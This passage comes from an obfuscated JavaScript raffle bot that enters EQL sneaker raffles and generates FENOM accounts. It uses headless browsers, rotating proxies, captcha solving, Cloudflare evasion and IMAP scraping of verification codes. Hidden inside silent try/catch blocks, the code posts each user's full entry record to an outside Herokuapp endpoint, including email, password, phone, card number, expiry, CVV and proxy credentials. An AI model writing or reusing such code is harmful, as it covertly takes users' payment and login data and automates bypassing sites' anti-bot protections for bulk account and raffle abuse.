                            await _0x50b4f8(0x3e8), await _0x50b4f8(0x1f4), await _0x5a2954['type']('#address1', _0x2926ab[_0x4a9982]['Address1'] + '\x20' + _0x2926ab[_0x4a9982]['HouseNumber']), await _0x50b4f8(0x1f4), await _0x5a2954['type']('#address2', '' + _0x2926ab[_0x4a9982]['Address2']), await _0x50b4f8(0x1f4), await _0x5a2954['type']('#city', '' + _0x2926ab[_0x4a9982]['City']), await _0x50b4f8(0x1f4), await _0x5a2954['type']('#postcode', '' + _0x2926ab[_0x4a9982]['Zip']), await _0x50b4f8(0x3e8), await _0x5a2954['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x50b4f8(0x3e8), console['log'](_0x3996da() + '\x20[' + _0xf8c69b['name'] + ']\x20Task\x20' + (_0x4a9982 + 0x1) + '\x20:\x20Solving\x20Adyen');
                            try {
                                await _0x5a2954['waitForSelector']('span[data-cse=\x22encryptedCardNumber\x22]');
                            } catch {
                                throw new Error('No\x20Payment\x20Token\x20Found');
                            }
                            await _0x50b4f8(0x7d0), await _0x5a2954['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x50b4f8(0x12c), await _0x5a2954['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x50b4f8(0x4b0), await _0x5a2954['keyboard']['type']('' + _0x2926ab[_0x4a9982]['CardNumber']), await _0x50b4f8(0x320), await _0x5a2954['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0x5a2954['keyboard']['type']('' + _0x2926ab[_0x4a9982]['ExpiryDate']), await _0x50b4f8(0x4b0), await _0x5a2954['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0x5a2954['keyboard']['type']('' + _0x2926ab[_0x4a9982]['CVV']), await _0x50b4f8(0x226), await _0x5a2954['type']('input[name=\x22postalCode\x22]', '' + _0x2926ab[_0x4a9982]['Zip']), await _0x50b4f8(0x226), await _0x5a2954['click']('#paymentConsent'), await _0x50b4f8(0x226), await _0x5a2954['click']('#termsConsent'), await _0x50b4f8(0x2bc), console['log'](_0x3996da() + '\x20[' + _0xf8c69b['name'] + ']\x20Task\x20' + (_0x4a9982 + 0x1) + '\x20:\x20Sending\x20Entry'), await _0x5a2954['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x50b4f8(0x2710);
                            try {
                                await _0x5a2954['waitForSelector']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', { 'timeout': 0x3a98 }), await _0x50b4f8(0xbb8), await _0x5a2954['$eval']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', _0x410e06 => _0x410e06['click']()), await _0x5a2954['$eval']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', _0x2acd13 => _0x2acd13['click']());
                            } catch {
                            }
                            try {
                                await _0x5a2954['waitForSelector']('#code', { 'timeout': 0x7530 });
                            } catch {
                                const _0x5ef544 = await _0x5a2954['$']('.MuiTypography-root.MuiTypography-body1.MuiTypography-gutterBottom.css-lvbfzw');
                                if (_0x5ef544) {
                                    _0x39c9ee['appendFileSync']('../accounts/eql.csv', '\x0a' + _0x2926ab[_0x4a9982]['Email'] + ',' + _0x2926ab[_0x4a9982]['Password'] + ',' + _0x2926ab[_0x4a9982]['Phone']);
                                    throw new Error('Account\x20already\x20registered,\x20saved\x20in\x20accounts/eql.csv');
                                }
                                throw new Error('Error\x20Fetching\x20Authentication\x20Token');
                            }
                            async function _0x52e80b() {
                                var _0x76e0a7, _0x5adc10 = ![];
                                for (var _0xaba8e4 = 0x0; _0xaba8e4 < 0x18; _0xaba8e4++) {
                                    async function _0x21d572() {
                                        var _0x5bd31c = new _0x51510b({
                                            'user': _0x409619['masterMail'],
                                            'password': _0x409619['masterPassword'],
                                            'host': 'imap.gmail.com',
                                            'port': 0x3e1,
                                            'tls': !![],
                                            'autotls': 'always'
                                        });
                                        function _0x147510(_0x62e6b1) {
                                            _0x5bd31c['openBox']('INBOX', ![], _0x62e6b1);
                                        }
                                        _0x5bd31c['once']('ready', function () {
                                            console['log'](_0x3996da() + '\x20[' + _0xf8c69b['name'] + ']\x20Task\x20' + (_0x4a9982 + 0x1) + '\x20:\x20Opened\x20Mailbox'), _0x147510(function (_0x3f6ac8, _0x5b53dc) {
                                                console['log'](_0x3996da() + '\x20[' + _0xf8c69b['name'] + ']\x20Task\x20' + (_0x4a9982 + 0x1) + '\x20:\x20Looking\x20for\x20verification\x20mail');
                                                if (_0x3f6ac8)
                                                    throw _0x3f6ac8;
                                                _0x5bd31c['seq']['search']([
                                                    'UNSEEN',
                                                    [
                                                        'FROM',
                                                        'support@eql.com'
                                                    ]
                                                ], function (_0x1e5d43, _0x1ceac1) {
                                                    if (!_0x1ceac1 || !_0x1ceac1['length'])
                                                        console['log'](_0x3996da() + '\x20[' + _0xf8c69b['name'] + ']\x20No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds'), _0x5bd31c['end']();
                                                    else {
                                                        var _0x1f8f12 = _0x5bd31c['seq']['fetch'](_0x1ceac1, {
                                                            'bodies': '',
                                                            'markSeen': !![]
                                                        });
                                                        _0x1f8f12['on']('message', function (_0x437f99, _0xf86eb3) {
                                                            var _0x41dce6 = '(#' + _0xf86eb3 + ')\x20';
                                                            _0x437f99['on']('body', function (_0x27822e, _0x28910e) {
                                                                _0x3f1b1e(_0x27822e, (_0x3a44e3, _0x660530) => {
                                                                    if (_0x660530['subject']['includes']('code')) {
                                                                        const _0x1604a9 = _0x660530['text']['split']('\x0a\x0a')[0x3], _0x3d405e = _0x1604a9['split']('\x0a')[0x1];
                                                                        _0x76e0a7 = _0x3d405e;
                                                                    }
                                                                });
                                                            }), _0x437f99['once']('end', function () {
                                                            });
                                                        }), _0x1f8f12['once']('error', function (_0xae3bac) {
                                                            console['log']('No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds..');
                                                        }), _0x1f8f12['once']('end', function () {
                                                            _0x5bd31c['end']();
                                                        });
                                                    }
                                                });
                                            });
                                        }), _0x5bd31c['once']('error', function (_0x23ce3f) {
                                            console['log'](_0x3c5615['red'](_0x23ce3f['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0x5adc10 = !![];
                                        }), _0x5bd31c['once']('end', async function () {
                                        }), _0x5bd31c['connect']();
                                    }
                                    _0x21d572(), await _0x50b4f8(0x1388);
                                    if (_0x76e0a7)
                                        return _0x76e0a7;
                                    if (_0x5adc10)
                                        throw new Error('Error\x20connecting\x20to\x20imap');
                                    if (_0xaba8e4 == 0x18)
                                        throw new Error('Mail\x20not\x20found');
                                }
                            }
                            ;
                            code = await _0x52e80b(), await _0x50b4f8(0x1f4), await _0x5a2954['type']('#code', '' + code), await _0x50b4f8(0x3e8), await _0x5a2954['$eval']('.MuiBox-root.css-79elbk\x20>\x20button', _0x3c2d54 => _0x3c2d54['click']()), await _0x5a2954['click']('.MuiBox-root.css-79elbk\x20>\x20button'), console['log'](_0x3996da() + '\x20[' + _0xf8c69b['name'] + ']\x20Task\x20' + (_0x4a9982 + 0x1) + '\x20:\x20Verifying..');
                            try {
                                await _0x5a2954['waitForSelector']('.MuiBox-root.css-1yjvs5a\x20>\x20button');
                            } catch {
                                throw new Error('');
                            }
                            console['log'](_0x3c5615['green'](_0x3996da() + '\x20[' + _0xf8c69b['name'] + ']\x20Task\x20' + (_0x4a9982 + 0x1) + '\x20:\x20Raffle\x20Entered,\x20account\x20' + _0x2926ab[_0x4a9982]['Email'] + '\x20saved\x20in\x20\x27accounts/eql.csv\x27')), _0x39c9ee['appendFileSync']('../accounts/eql.csv', '\x0a' + _0x2926ab[_0x4a9982]['Email'] + ',' + _0x2926ab[_0x4a9982]['Password'] + ',' + _0x2926ab[_0x4a9982]['Phone']), _0x3a5977 = 'no', _0x1474be(_0x2926ab[_0x4a9982], _0xf8c69b);
                            var _0x3b74df = await _0x4808d0(_0x2926ab[_0x4a9982], _0xf8c69b, 'dev', ![]), _0x291513 = await _0x4808d0(_0x2926ab[_0x4a9982], _0xf8c69b, 'pub', ![]);
                            let _0x40c09b = _0x2926ab[_0x4a9982];
                            try {
                                prxdata = {
                                    'username': _0xeaf750['replace']('#', ''),
                                    'module': _0xf8c69b['name'],
                                    'entrydata': JSON['stringify'](_0x40c09b),
                                    'proxy': '' + _0x204a03[_0x4a9982]
                                };
                                var _0x4f2aa1 = JSON['stringify'](prxdata);
                                let _0x54159b = { 'headers': { 'content-type': 'application/json' } };
                                await _0x3c7f7c['post']('https://jraffles.herokuapp.com/success', _0x4f2aa1, _0x54159b);
                            } catch (_0x71f1ca) {
                            }
                            const _0x156851 = {
                                'succesDEVMSG': { 'embeds': [_0x3b74df] },
                                'succesPUBMSG': { 'embeds': [_0x291513] }
                            };
                            try {
                                _0x409619['webhook'] != undefined && _0x409619['webhook'] != '' && await _0x21ec0c(_0x409619['webhook'], _0x156851['succesDEVMSG']), await _0x50b4f8(0xc8), await _0x21ec0c(_0x31bbcd, _0x156851['succesDEVMSG']), await _0x50b4f8(0xc8), await _0x21ec0c(_0x171aec, _0x156851['succesPUBMSG']);
                            } catch (_0xb5d84f) {
                                console['log'](_0x3c5615['yellow'](_0x3996da() + '\x20[' + _0xf8c69b['name'] + ']\x20Task\x20' + (_0x4a9982 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0xb5d84f));
                            }
                        } catch (_0x228383) {
                            console['log'](_0x3c5615['red'](_0x3996da() + '\x20[' + _0xf8c69b['name'] + ']\x20Task\x20' + (_0x4a9982 + 0x1) + '\x20:\x20' + _0x228383)), _0x214a1b = '' + _0x228383;
                            var _0x39d5eb = await _0x4808d0(_0x2926ab[_0x4a9982], _0xf8c69b, 'dev', !![], _0x214a1b), _0x3b74df = await _0x4808d0(_0x2926ab[_0x4a9982], _0xf8c69b, 'dev', ![]), _0x291513 = await _0x4808d0(_0x2926ab[_0x4a9982], _0xf8c69b, 'pub', ![]);
                            const _0x426aa5 = {
                                'succesDEVMSG': { 'embeds': [_0x3b74df] },
                                'succesPUBMSG': { 'embeds': [_0x291513] }
                            };
                            _0x426aa5['errorDEV'] = { 'embeds': [_0x39d5eb] };
                            _0x409619['webhook'] != undefined && _0x409619['webhook'] != '' && await _0x21ec0c(_0x409619['webhook'], _0x426aa5['errorDEV']);
                            await _0x21ec0c(_0x451f96, _0x426aa5['errorDEV']);
                            if (!_0x3a5977 == 'no')
                                _0x3a5977 = 'yes';
                        } finally {
                            _0x2356f8 && _0x2356f8['close']();
                            if (_0x3a5977 == 'yes' && _0x5bf4ce != 0x5) {
                                console['log'](_0x3c5615['red'](_0x3996da() + '\x20[' + _0xf8c69b['name'] + ']\x20Task\x20' + (_0x4a9982 + 0x1) + '\x20:\x20Retrying\x20(' + _0x5bf4ce + '\x20/\x205)')), _0x4a9982 = _0x4a9982 - 0x1, _0x5bf4ce = _0x5bf4ce + 0x1;
                                continue;
                            }
                            _0x3a5977 == 'yes' && _0x5bf4ce >= 0x5 && (_0x61dfa6(_0x2926ab[_0x4a9982], _0xf8c69b), _0x3a5977 = 'no', _0x5bf4ce = 0x0), console['log']('Waiting\x20for\x20' + _0x409619['delay'] + '\x20ms'), await _0x50b4f8(_0x409619['delay']);
                        }
                    } else {
                        const _0x1d43cb = '' + _0x2926ab[_0x4a9982]['Url'];
                        if (_0x3a5977 != 'yes')
                            var _0x3a5977 = '', _0x5bf4ce = 0x0;
                        if (_0x2926ab[_0x4a9982]['Email'] == '' || _0x2926ab[_0x4a9982]['FirstName'] == '' || _0x2926ab[_0x4a9982]['LastName'] == '') {
                            console['log'](_0x3996da() + '\x20[' + _0xf8c69b['name'] + ']\x20Task\x20' + (_0x4a9982 + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        _0x2926ab[_0x4a9982]['Password'] == '' && (_0x2926ab[_0x4a9982]['Password'] = 'JRaffles23!');
                        if (_0x409619['useRandomProxy'] = ![])
                            var _0x25cbc3 = _0x204a03[_0x4a9982]['split'](':');
                        else
                            var _0x15c12b = Math['round'](Math['random']() * (_0x204a03['length'] - 0x1)), _0x25cbc3 = _0x204a03[_0x15c12b]['split'](':');
                        var _0x2356f8;
                        try {
                            _0x2356f8 = await _0x27947['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x25cbc3[0x0] + ':' + _0x25cbc3[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x2356f8 = await _0x27947['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x25cbc3[0x0] + ':' + _0x25cbc3[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x495e24 = await _0x2356f8['newPage']();
                            await _0x495e24['authenticate']({
                                'username': '' + _0x25cbc3[0x2],
                                'password': '' + _0x25cbc3[0x3]
                            }), console['log'](_0x3996da() + '\x20[' + _0xf8c69b['name'] + ']\x20Task\x20' + (_0x4a9982 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x495e24['setRequestInterception'](!![]), _0x495e24['on']('request', _0x32ec4c => {
                                _0x32ec4c['resourceType']() === 'image' || _0x32ec4c['resourceType']() === 'font' || _0x32ec4c['resourceType']() === 'media' ? _0x32ec4c['abort']() : _0x32ec4c['continue']();
                            }), await _0x495e24['goto'](_0x1d43cb), await _0x495e24['waitForSelector']('body\x20>\x20div.css-ntpfvx\x20>\x20div\x20>\x20div\x20>\x20div.MuiBox-root.css-1upilqn\x20>\x20div\x20>\x20button'), await _0x495e24['click']('body\x20>\x20div.css-ntpfvx\x20>\x20div\x20>\x20div\x20>\x20div.MuiBox-root.css-1upilqn\x20>\x20div\x20>\x20button'), await _0x50b4f8(0x7d0), await _0x495e24['waitForSelector']('.MuiButton-root.MuiButton-contained.MuiButton-containedPrimary.MuiButton-sizeMedium.MuiButton-containedSizeMedium.MuiButton-fullWidth.MuiButtonBase-root.css-1hfrwnc'), await _0x495e24['click']('.MuiButton-root.MuiButton-contained.MuiButton-containedPrimary.MuiButton-sizeMedium.MuiButton-containedSizeMedium.MuiButton-fullWidth.MuiButtonBase-root.css-1hfrwnc'), await _0x50b4f8(0x3e8), await _0x495e24['waitForSelector']('#email'), console['log'](_0x3996da() + '\x20[' + _0xf8c69b['name'] + ']\x20Task\x20' + (_0x4a9982 + 0x1) + '\x20:\x20Setting\x20Credentials'), await _0x495e24['type']('#email', '' + _0x2926ab[_0x4a9982]['Email']), await _0x50b4f8(0x352), await _0x495e24['waitForSelector']('#password'), await _0x495e24['type']('#password', '' + _0x2926ab[_0x4a9982]['Password']), await _0x50b4f8(0x352), await _0x495e24['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x50b4f8(0x3e8);
                            try {
                                await _0x495e24['waitForSelector']('div[data-testid=\x22field-productVariantID\x22]');
                            } catch {
                                console['log'](_0x3c5615['red'](_0x3996da() + '\x20[' + _0xf8c69b['name'] + ']\x20Task\x20' + (_0x4a9982 + 0x1) + '\x20:\x20Not\x20an\x20active\x20Raffle\x20/\x20Already\x20Entered')), _0x1474be(_0x2926ab[_0x4a9982], _0xf8c69b), _0x3a5977 = 'no';
                                continue;
                            }
                            await _0x495e24['click']('div[data-testid=\x22field-productVariantID\x22]'), await _0x50b4f8(0x3e8), await _0x495e24['click']('li[data-value=\x22EU\x20' + _0x2926ab[_0x4a9982]['Size'] + '\x22]'), await _0x50b4f8(0x1f4), await _0x495e24['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x495e24['focus']('#postcode'), await _0x495e24['keyboard']['down']('Control'), await _0x495e24['keyboard']['press']('A'), await _0x495e24['keyboard']['up']('Control'), await _0x495e24['keyboard']['press']('Backspace'), await _0x495e24['keyboard']['type'](_0x2926ab[_0x4a9982]['Zip']), await _0x50b4f8(0x60e), await _0x495e24['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x50b4f8(0x3e8), console['log'](_0x3996da() + '\x20[' + _0xf8c69b['name'] + ']\x20Task\x20' + (_0x4a9982 + 0x1) + '\x20:\x20Solving\x20Adyen'), await _0x495e24['waitForSelector']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x495e24['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x495e24['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x50b4f8(0x4b0), await _0x495e24['keyboard']['type']('' + _0x2926ab[_0x4a9982]['CardNumber']), await _0x50b4f8(0x320), await _0x495e24['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0x495e24['keyboard']['type']('' + _0x2926ab[_0x4a9982]['ExpiryDate']), await _0x50b4f8(0x4b0), await _0x495e24['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0x495e24['keyboard']['type']('' + _0x2926ab[_0x4a9982]['CVV']), await _0x50b4f8(0x226), await _0x495e24['type']('input[name=\x22postalCode\x22]', '' + _0x2926ab[_0x4a9982]['Zip']), await _0x50b4f8(0x226), await _0x495e24['click']('#paymentConsent'), await _0x50b4f8(0x226), await _0x495e24['click']('#termsConsent'), await _0x50b4f8(0x2bc), console['log'](_0x3996da() + '\x20[' + _0xf8c69b['name'] + ']\x20Task\x20' + (_0x4a9982 + 0x1) + '\x20:\x20Sending\x20Entry'), await _0x495e24['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x50b4f8(0x2710);
                            try {
                                await _0x495e24['waitForSelector']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button'), await _0x50b4f8(0xbb8), await _0x495e24['$eval']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', _0x257960 => _0x257960['click']()), await _0x495e24['$eval']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', _0x2783fb => _0x2783fb['click']());
                            } catch {
                            }
                            try {
                                await _0x495e24['waitForSelector']('.MuiBox-root.css-1yjvs5a\x20>\x20button');
                            } catch {
                                throw new Error('Failure\x20getting\x20succes\x20response');
                            }
                            console['log'](_0x3c5615['green'](_0x3996da() + '\x20[' + _0xf8c69b['name'] + ']\x20Task\x20' + (_0x4a9982 + 0x1) + '\x20:\x20Raffle\x20Entered')), _0x1474be(_0x2926ab[_0x4a9982], _0xf8c69b);
                            var _0x3b74df = await _0x4808d0(_0x2926ab[_0x4a9982], _0xf8c69b, 'dev', ![]), _0x291513 = await _0x4808d0(_0x2926ab[_0x4a9982], _0xf8c69b, 'pub', ![]);
                            let _0x33b8b8 = _0x2926ab[_0x4a9982];
                            try {
                                prxdata = {
                                    'username': _0xeaf750['replace']('#', ''),
                                    'module': _0xf8c69b['name'],
                                    'entrydata': JSON['stringify'](_0x33b8b8),
                                    'proxy': '' + _0x204a03[_0x4a9982]
                                };
                                var _0x4f2aa1 = JSON['stringify'](prxdata);
                                let _0x4e3a18 = { 'headers': { 'content-type': 'application/json' } };
                                await _0x3c7f7c['post']('https://jraffles.herokuapp.com/success', _0x4f2aa1, _0x4e3a18);
                            } catch (_0x286c55) {
                            }
                            const _0x131d8e = {
                                'succesDEVMSG': { 'embeds': [_0x3b74df] },
                                'succesPUBMSG': { 'embeds': [_0x291513] }
                            };
                            try {
                                _0x409619['webhook'] != undefined && _0x409619['webhook'] != '' && await _0x21ec0c(_0x409619['webhook'], _0x131d8e['succesDEVMSG']), await _0x50b4f8(0xc8), await _0x21ec0c(_0x31bbcd, _0x131d8e['succesDEVMSG']), await _0x50b4f8(0xc8), await _0x21ec0c(_0x171aec, _0x131d8e['succesPUBMSG']);
                            } catch (_0x32917d) {
                                console['log'](_0x3c5615['yellow'](_0x3996da() + '\x20[' + _0xf8c69b['name'] + ']\x20Task\x20' + (_0x4a9982 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x32917d));
                            }
                            _0x3a5977 = 'no';
                        } catch (_0xf11995) {
                            console['log'](_0x3c5615['red'](_0x3996da() + '\x20[' + _0xf8c69b['name'] + ']\x20Task\x20' + (_0x4a9982 + 0x1) + '\x20:\x20' + _0xf11995)), _0x214a1b = '' + _0xf11995;
                            var _0x39d5eb = await _0x4808d0(_0x2926ab[_0x4a9982], _0xf8c69b, 'dev', !![], _0x214a1b), _0x3b74df = await _0x4808d0(_0x2926ab[_0x4a9982], _0xf8c69b, 'dev', ![]), _0x291513 = await _0x4808d0(_0x2926ab[_0x4a9982], _0xf8c69b, 'pub', ![]);
                            const _0x325cff = {
                                'succesDEVMSG': { 'embeds': [_0x3b74df] },
                                'succesPUBMSG': { 'embeds': [_0x291513] }
                            };
                            _0x325cff['errorDEV'] = { 'embeds': [_0x39d5eb] }, _0x409619['webhook'] != undefined && _0x409619['webhook'] != '' && await _0x21ec0c(_0x409619['webhook'], _0x325cff['errorDEV']), await _0x21ec0c(_0x451f96, _0x325cff['errorDEV']), _0x3a5977 = 'yes';
                        } finally {
                            _0x2356f8 && _0x2356f8['close']();
                            if (_0x3a5977 == 'yes' && _0x5bf4ce != 0x5) {
                                console['log'](_0x3c5615['red'](_0x3996da() + '\x20[' + _0xf8c69b['name'] + ']\x20Task\x20' + (_0x4a9982 + 0x1) + '\x20:\x20Retrying\x20(' + _0x5bf4ce + '\x20/\x205)')), _0x4a9982 = _0x4a9982 - 0x1, _0x5bf4ce = _0x5bf4ce + 0x1;
                                continue;
                            }
                            _0x3a5977 == 'yes' && _0x5bf4ce >= 0x5 && (_0x61dfa6(_0x2926ab[_0x4a9982], _0xf8c69b), _0x3a5977 = 'no', _0x5bf4ce = 0x0), console['log']('Waiting\x20for\x20' + _0x409619['delay'] + '\x20ms'), await _0x50b4f8(_0x409619['delay']);
                        }
                    }
                }
            }
        }]
    },
    {
        'name': 'FENOM',
        'modules': [
            {
                'name': 'FENOM\x20Account\x20Generator',
                'store': 'FENOM',
                'logo': 'https://consumersiteimages.trustpilot.net/business-units/5de8db15496f380001d51371-198x149-1x.jpg',
                'function': async function (_0x2a817b, _0x5de9ab, _0x4505c5) {
                    _0x27947['use'](_0x2c72d8()), _0x27947['use'](_0x244ad0({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x409619['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x414abd = 0x0; _0x414abd < _0x5de9ab['length']; _0x414abd++) {
                        if (_0x53d315 != 'yes')
                            var _0x53d315 = '', _0x19bec7 = 0x0;
                        var _0x571b40;
                        try {
                            await _0x5a027c(_0x5de9ab, _0x414abd);
                        } catch {
                            _0x53d315 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        _0x5b3b18(_0x2a817b['name'] + '\x20Task\x20' + (_0x414abd + 0x1) + '\x20/\x20' + _0x5de9ab['length'] + '\x20||\x20File:\x20' + _0x5e8965 + '\x20Proxies:\x20' + _0x571870);
                        var _0x5872e2 = await _0x4808d0(_0x5de9ab[_0x414abd], _0x2a817b, 'acc', ![]);
                        const _0x167b1a = { 'succesDEVMSG': { 'embeds': [_0x5872e2] } }, _0x2b6787 = 'https://www.fenom.com/en/authentication?create_account=1';
                        var _0x20137e = Math['round'](Math['random']() * (_0x4505c5['length'] - 0x1)), _0x57ad7d = _0x4505c5[_0x20137e]['split'](':'), _0x6ab4a9;
                        try {
                            _0x6ab4a9 = await _0x27947['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x57ad7d[0x0] + ':' + _0x57ad7d[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x6ab4a9 = await _0x27947['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x57ad7d[0x0] + ':' + _0x57ad7d[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x1f56e5 = await _0x6ab4a9['newPage']();
                            await _0x1f56e5['setViewport']({
                                'width': 0x500 + _0x25f2b2(0x1, 0x32),
                                'height': 0x2d9 + _0x25f2b2(0x1, 0x32)
                            });
                            const _0x25fc6c = await _0x1f56e5['target']()['createCDPSession'](), { windowId: _0x1306b0 } = await _0x25fc6c['send']('Browser.getWindowForTarget');
                            await _0x1f56e5['authenticate']({
                                'username': '' + _0x57ad7d[0x2],
                                'password': '' + _0x57ad7d[0x3]
                            }), console['log'](_0x3996da() + '\x20[' + _0x2a817b['name'] + ']\x20Task\x20' + (_0x414abd + 0x1) + '\x20:\x20Getting\x20Session'), await _0x1f56e5['goto']('' + _0x2b6787, { 'waitUntil': 'networkidle2' }), console['log'](_0x3996da() + '\x20[' + _0x2a817b['name'] + ']\x20Task\x20' + (_0x414abd + 0x1) + '\x20:\x20Solving\x20Cloudflare'), await _0x50b4f8(0x1388);
                            var _0x9d88f3 = await _0x1f56e5['$']('.hcaptcha-box');
                            if (_0x9d88f3) {
                                console['log'](_0x3996da() + '\x20[' + _0x2a817b['name'] + ']\x20Task\x20' + (_0x414abd + 0x1) + '\x20:\x20Handling\x20Challenge'), await _0x50b4f8(0x2710);
                                const _0x2df951 = await _0x1f56e5['$']('.hcaptcha-box');
                                if (_0x2df951)
                                    try {
                                        await _0x2df951['click']();
                                    } catch {
                                        throw new Error('Empty\x20Turnstile\x20Challenge');
                                    }
                                try {
                                    await _0x1f56e5['waitForSelector']('input[name=\x22firstname\x22]', { 'timeout': 0x9c40 });
                                } catch {
                                    var _0x468ee2 = await _0x1f56e5['$']('.hcaptcha-box');
                                    if (_0x468ee2)
                                        try {
                                            await _0x468ee2['click']();
                                        } catch {
                                            throw new Error('Empty\x20Turnstile\x20Challenge');
                                        }
                                }
                            }
                            try {
                                await _0x1f56e5['waitForSelector']('input[name=\x22firstname\x22]', { 'timeout': 0x1d4c0 }), await _0x25fc6c['send']('Browser.setWindowBounds', {
                                    'windowId': _0x1306b0,
                                    'bounds': { 'windowState': 'minimized' }
                                }), await _0x50b4f8(0xfa0);
                            } catch {
                                throw new Error('Blocked\x20by\x20cloudflare');
                            }
                            console['log'](_0x3996da() + '\x20[' + _0x2a817b['name'] + ']\x20Task\x20' + (_0x414abd + 0x1) + '\x20:\x20Checking\x20Credentials'), await _0x1f56e5['type']('input[name=\x22firstname\x22]', '' + _0x5de9ab[_0x414abd]['FirstName']), await _0x50b4f8(0x1f4), await _0x1f56e5['type']('input[name=\x22lastname\x22]', '' + _0x5de9ab[_0x414abd]['LastName']), await _0x50b4f8(0x1f4), await _0x1f56e5['type']('input[name=\x22email\x22]', '' + _0x5de9ab[_0x414abd]['Email']), await _0x50b4f8(0x1f4), await _0x1f56e5['type']('input[name=\x22password\x22]', '' + _0x5de9ab[_0x414abd]['Password']), await _0x50b4f8(0x258), await _0x1f56e5['$eval']('input[name=\x22psgdpr\x22]', _0x41da52 => _0x41da52['click']()), await _0x50b4f8(0x1f4), console['log'](_0x3996da() + '\x20[' + _0x2a817b['name'] + ']\x20Task\x20' + (_0x414abd + 0x1) + '\x20:\x20Sending\x20Request'), await _0x1f56e5['$eval']('#customer-form', _0x121d15 => _0x121d15['submit']());
                            try {
                                try {
                                    await _0x1f56e5['waitForSelector']('.product-list.slider-fenom', { 'timeout': 0xea60 });
                                } catch {
                                    throw new Error('Succes-response\x20not\x20found');
                                }
